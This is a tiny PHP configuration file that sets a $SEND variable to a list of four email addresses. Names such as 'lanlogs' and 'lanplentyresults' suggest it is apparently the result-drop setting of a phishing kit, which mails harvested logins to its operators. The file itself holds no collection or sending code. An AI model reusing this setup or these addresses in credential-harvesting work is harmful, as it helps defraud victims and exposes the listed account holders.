<?php
$SEND = "christopherscorto2021@gmail.com,lanlogs@yandex.com,lanplentyresults21@protonmail.com,lanplentyresults@myself.com";

?>